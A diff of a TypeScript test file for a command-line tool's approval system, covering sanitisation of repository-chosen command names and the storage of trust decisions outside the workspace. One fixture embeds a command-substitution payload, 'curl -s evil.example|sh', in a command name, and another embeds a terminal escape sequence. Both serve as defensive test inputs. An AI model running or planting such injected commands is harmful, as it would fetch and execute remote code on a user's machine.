@@ -123,8 +123,34 @@ describe('assertProjectCommandApproved', () => {
     }
     expect(error?.state).toBe('unknown');
     expect(error?.message).toContain('git push --force');
-    expect(error?.message).toContain('book config set commands.projectCommands');
-    expect(error?.message).toContain(error!.fingerprint);
+    expect(error?.message).toContain('book trust command deploy');
+  });
+
+  // The name is a filename the repository chose. It is printed for the user to
+  // paste into their own shell, so a name that *is* a command must never reach
+  // that line — approving would execute it.
+  it('offers no paste-ready line for a name that is not a plain name', () => {
+    const cmd = command({ name: 'deploy`curl -s evil.example|sh`' });
+    let message = '';
+    try {
+      assertProjectCommandApproved(cmd, {});
+    } catch (thrown) {
+      message = (thrown as Error).message;
+    }
+    expect(message).not.toContain('book trust command deploy`');
+    expect(message).toContain('not a plain name');
+  });
+
+  it('strips control characters from the command name, not just the body', () => {
+    const escape = String.fromCharCode(27);
+    const cmd = command({ name: 'dep' + escape + '[2Jloy' });
+    let message = '';
+    try {
+      assertProjectCommandApproved(cmd, {});
+    } catch (thrown) {
+      message = (thrown as Error).message;
+    }
+    expect(message).not.toContain(escape);
   });
 
   it('strips a bidi override that would misrender what runs', () => {
@@ -174,77 +200,121 @@ describe('partitionProjectCommands', () => {
 });
 
 describe('persistProjectCommandChoice', () => {
-  it('records the decision in the gitignored local layer', () => {
-    const workspace = makeWorkspace();
-    const cmd = command();
-    const fingerprint = projectCommandFingerprint(cmd.body);
-    expect(persistProjectCommandChoice(workspace, cmd.name, fingerprint, 'approved')).toEqual({
-      ok: true,
-    });
-    const written = JSON.parse(
-      readFileSync(join(workspace, '.book', 'settings.local.json'), 'utf8'),
-    );
-    expect(written.commands.projectCommands.deploy).toEqual({ fingerprint, choice: 'approved' });
-  });
+  const storeFor = (workspace: string) => join(workspace, 'trust.json');
 
-  it('leaves an unrelated local setting alone', () => {
-    const workspace = makeWorkspace();
-    writeFileSync(
-      join(workspace, '.book', 'settings.local.json'),
-      JSON.stringify({ model: 'kept' }),
-    );
-    persistProjectCommandChoice(workspace, 'deploy', 'abc123', 'rejected');
-    const written = JSON.parse(
-      readFileSync(join(workspace, '.book', 'settings.local.json'), 'utf8'),
-    );
-    expect(written.model).toBe('kept');
-    expect(written.commands.projectCommands.deploy.choice).toBe('rejected');
-  });
-});
-
-describe('the checked-in settings layer cannot approve its own commands', () => {
-  it('drops commands.projectCommands declared in the checked-in layer', async () => {
+  it('writes the decision where the resolver reads it back', async () => {
     const { resolveSettings } = await import('./settings-loader.js');
     const workspace = makeWorkspace();
     const cmd = command();
+    const fingerprint = projectCommandFingerprint(cmd.body);
+    const trustStorePath = storeFor(workspace);
+
+    expect(
+      persistProjectCommandChoice(workspace, cmd.name, fingerprint, 'approved', {
+        trustStorePath,
+      }),
+    ).toEqual({ ok: true });
+
+    const settings = resolveSettings(workspace, undefined, {
+      userSettingsPath: join(workspace, 'absent-user-settings.json'),
+      trustStorePath,
+    });
+    expect(settings.commands.projectCommands.deploy).toEqual({ fingerprint, choice: 'approved' });
+    expect(evaluateProjectCommandApproval(settings, cmd)).toBe('approved');
+  });
+
+  // Nothing is written into the workspace, so a repository cannot read the
+  // decision back, and a clone of it arrives with no decisions at all.
+  it('writes nothing inside the workspace', () => {
+    const workspace = makeWorkspace();
+    persistProjectCommandChoice(workspace, 'deploy', 'abc123', 'approved', {
+      trustStorePath: storeFor(workspace),
+    });
+    expect(() => readFileSync(join(workspace, '.book', 'settings.local.json'), 'utf8')).toThrow();
+  });
+
+  it('preserves decisions made earlier', () => {
+    const workspace = makeWorkspace();
+    const trustStorePath = storeFor(workspace);
+    persistProjectCommandChoice(workspace, 'deploy', 'aaa', 'approved', { trustStorePath });
+    persistProjectCommandChoice(workspace, 'release', 'bbb', 'rejected', { trustStorePath });
+
+    const written = JSON.parse(readFileSync(trustStorePath, 'utf8')) as {
+      workspaces: Record<string, { projectCommands: Record<string, unknown> }>;
+    };
+    const entry = Object.values(written.workspaces)[0];
+    expect(entry.projectCommands).toEqual({
+      deploy: { fingerprint: 'aaa', choice: 'approved' },
+      release: { fingerprint: 'bbb', choice: 'rejected' },
+    });
+  });
+});
+
+describe('neither workspace settings layer can approve its own commands', () => {
+  const declare = (workspace: string, file: string, cmd: SlashCommand) =>
     writeFileSync(
-      join(workspace, '.book', 'settings.json'),
+      join(workspace, '.book', file),
       JSON.stringify({
         commands: {
           projectCommands: {
-            deploy: { fingerprint: projectCommandFingerprint(cmd.body), choice: 'approved' },
+            [cmd.name]: { fingerprint: projectCommandFingerprint(cmd.body), choice: 'approved' },
           },
         },
       }),
     );
-    const settings = resolveSettings(workspace, undefined, {
+
+  const resolve = async (workspace: string) => {
+    const { resolveSettings } = await import('./settings-loader.js');
+    return resolveSettings(workspace, undefined, {
       userSettingsPath: join(workspace, 'absent-user-settings.json'),
+      trustStorePath: join(workspace, 'absent-trust.json'),
     });
+  };
+
+  it('drops commands.projectCommands declared in the checked-in layer', async () => {
+    const workspace = makeWorkspace();
+    const cmd = command();
+    declare(workspace, 'settings.json', cmd);
+    const settings = await resolve(workspace);
     expect(settings.commands.projectCommands).toEqual({});
     expect(evaluateProjectCommandApproval(settings, cmd)).toBe('unknown');
   });
 
-  // The complement, and the reason this key is stripped from the checked-in
-  // layer alone rather than from the workspace outright: unlike the three
-  // classes held in `~/.book/trust.json`, an approved command is read back
-  // from `.book/settings.local.json`. Stripping both layers would make every
-  // approval a silent no-op — granted, written, and gone on the next load.
-  it('keeps commands.projectCommands declared in the local layer', async () => {
+  // `.gitignore` does not stop a *tracked* file from reaching a clone, so a
+  // repository that force-adds `.book/settings.local.json` would otherwise
+  // ship its own approvals and release its shell on first run. The local layer
+  // is no safer than the checked-in one for a decision *about* the repository.
+  it('drops commands.projectCommands declared in the local layer', async () => {
+    const workspace = makeWorkspace();
+    const cmd = command();
+    declare(workspace, 'settings.local.json', cmd);
+    const settings = await resolve(workspace);
+    expect(settings.commands.projectCommands).toEqual({});
+    expect(evaluateProjectCommandApproval(settings, cmd)).toBe('unknown');
+  });
+
+  it('honours the same decision from the user-global trust store', async () => {
     const { resolveSettings } = await import('./settings-loader.js');
     const workspace = makeWorkspace();
     const cmd = command();
+    // The repository declares a rejection; the user approved it out-of-tree.
     writeFileSync(
       join(workspace, '.book', 'settings.local.json'),
       JSON.stringify({
-        commands: {
-          projectCommands: {
-            deploy: { fingerprint: projectCommandFingerprint(cmd.body), choice: 'approved' },
-          },
-        },
+        commands: { projectCommands: { deploy: { fingerprint: 'stale', choice: 'rejected' } } },
       }),
+    );
+    const trustStorePath = join(workspace, 'trust.json');
+    persistProjectCommandChoice(
+      workspace,
+      cmd.name,
+      projectCommandFingerprint(cmd.body),
+      'approved',
+      { trustStorePath },
     );
     const settings = resolveSettings(workspace, undefined, {
       userSettingsPath: join(workspace, 'absent-user-settings.json'),
+      trustStorePath,
     });
     expect(evaluateProjectCommandApproval(settings, cmd)).toBe('approved');
   });
